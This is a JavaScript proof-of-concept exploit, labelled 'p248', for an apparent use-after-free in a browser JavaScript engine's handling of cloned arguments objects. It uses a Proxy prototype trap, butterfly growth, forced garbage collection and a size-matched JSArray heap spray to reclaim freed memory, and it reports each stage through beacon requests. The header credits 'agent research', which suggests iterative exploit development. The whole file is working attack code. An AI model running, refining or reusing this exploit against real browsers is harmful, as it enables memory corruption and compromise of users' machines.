// p248 - ClonedArguments butterfly UAF v2
// Combines p221's growth strategy with p246's JSArray spray
//
// Key lessons from agent research:
// - growArrayRight() ALWAYS allocates new butterfly, orphans old
// - Old butterfly stays in its MarkedBlock size class free list
// - Need 800K+ GC objects to trigger full sweep of orphaned MarkedBlock
// - Spray with JSArrays matching old butterfly size class (same allocator space)
// - 64 args → ~552 byte butterfly → spray with Array(69) for ~560 byte butterflies
//
// Beacon prefix: V248-

(function() {
  function B(tag, body) {
    try {
      var url = '/beacon/V248-' + tag + '?t=' + Date.now();
      navigator.sendBeacon(url, body || '');
    } catch(e) {}
  }
  function hex(v) { return ('00000000' + (v >>> 0).toString(16)).slice(-8); }

  B('BOOT');

  function attempt(round) {
    var sprayArrs = [];

    function mkArgs() { return arguments; }
    function receiver() { return Array.prototype.slice.call(arguments); }

    var N = 64;
    var argArr = [];
    for (var i = 0; i < N; i++) argArr.push(0xAA000000 + round * 0x10000 + i);
    var args = mkArgs.apply(null, argArr);

    delete args[5];
    B('R' + round + '-HOLES');

    var trapFired = false;
    var self = args;

    Object.setPrototypeOf(args, new Proxy({}, {
      get: function(t, prop) {
        if (trapFired) return 0xFACE0000 + round;
        if (prop !== '5') return undefined;
        trapFired = true;
        B('R' + round + '-TRAP');

        try {
          // Step 1: Grow butterfly via direct indexing
          // This calls growArrayRight() which allocates NEW butterfly
          // and orphans the old 552-byte one
          for (var j = 100; j < 1000; j++) {
            self[j] = 0x41414141;
          }
          B('R' + round + '-GREW');

          // Step 2: Massive GC pressure (800K+ objects)
          // Need to trigger full GC sweep to process orphaned MarkedBlock
          var junk;
          for (var g = 0; g < 50; g++) {
            junk = new Array(10000);
            for (var k = 0; k < 10000; k++) {
              junk[k] = {x: k, y: String(k)};
            }
          }
          junk = null;
          for (var g2 = 0; g2 < 30; g2++) {
            junk = new Array(10000);
            for (var k2 = 0; k2 < 10000; k2++) {
              junk[k2] = {a: k2};
            }
          }
          junk = null;
          B('R' + round + '-GC-800K');

          // Step 3: Spray JSArrays with matching butterfly size
          // Old butterfly: 64 args → outOfLine(4*8=32) + hdr(8) + 64*8(512) = 552
          // MarkedSpace rounds to ~560 size class
          // Array(69): 0 + 8 + 69*8 = 560 → same size class
          var SPRAY = 5000;
          for (var s = 0; s < SPRAY; s++) {
            var arr = new Array(69);
            for (var e = 0; e < 69; e++) {
              arr[e] = (0xCAFE0000 | (s & 0xFFFF)) >>> 0;
            }
            sprayArrs.push(arr);
          }
          // Extra spray with adjacent size classes
          for (var s2 = 0; s2 < 500; s2++) {
            var arr68 = new Array(68);
            for (var e68 = 0; e68 < 68; e68++) arr68[e68] = (0xD0AD0000 | s2) >>> 0;
            sprayArrs.push(arr68);
            var arr70 = new Array(70);
            for (var e70 = 0; e70 < 70; e70++) arr70[e70] = (0xBEAD0000 | s2) >>> 0;
            sprayArrs.push(arr70);
          }
          B('R' + round + '-SPRAY-' + sprayArrs.length);
        } catch(e) {
          B('R' + round + '-TRAP-ERR-' + e.message.substring(0, 40));
        }

        return 0xBEEF0000 + round;
      }
    }));

    var result;
    try {
      result = receiver.apply(null, args);
    } catch(e) {
      B('R' + round + '-APPLY-ERR-' + e.message.substring(0, 40));
      return;
    }

    if (!result) { B('R' + round + '-NO-RESULT'); return; }
    B('R' + round + '-LEN-' + result.length);

    var cafeHits = 0, doadHits = 0, beadHits = 0, origHits = 0;
    var vals = [];
    for (var i = 0; i < Math.min(result.length, 64); i++) {
      var v = result[i];
      if (typeof v !== 'number') {
        vals.push(i + '=T:' + typeof v);
        continue;
      }
      var u = v >>> 0;
      var hi16 = u >>> 16;
      vals.push(i + '=' + hex(u));
      if (hi16 === 0xCAFE) cafeHits++;
      else if (hi16 === 0xD0AD) doadHits++;
      else if (hi16 === 0xBEAD) beadHits++;
      else if (u === (0xAA000000 + round * 0x10000 + i)) origHits++;
    }

    B('R' + round + '-VALS', vals.join(' '));
    B('R' + round + '-CAFE-' + cafeHits + '-DOAD-' + doadHits + '-BEAD-' + beadHits + '-ORIG-' + origHits);

    if (cafeHits + doadHits + beadHits > 0) {
      B('R' + round + '-RECLAIM-HIT');
      // Identify which spray array reclaimed the slot
      for (var s = 0; s < sprayArrs.length && s < 6000; s++) {
        if (sprayArrs[s] && sprayArrs[s][0] !== undefined) {
          var sv = sprayArrs[s][0] >>> 0;
          for (var ri = 6; ri < Math.min(result.length, 20); ri++) {
            if (typeof result[ri] === 'number' && (result[ri] >>> 0) === sv) {
              B('R' + round + '-MATCH-SPRAY-' + s + '-AT-' + ri);
              break;
            }
          }
        }
      }
    }
  }

  for (var r = 0; r < 3; r++) {
    try {
      attempt(r);
    } catch(e) {
      B('R' + r + '-ERR-' + e.message.substring(0, 60));
    }
  }

  B('DONE');
})();
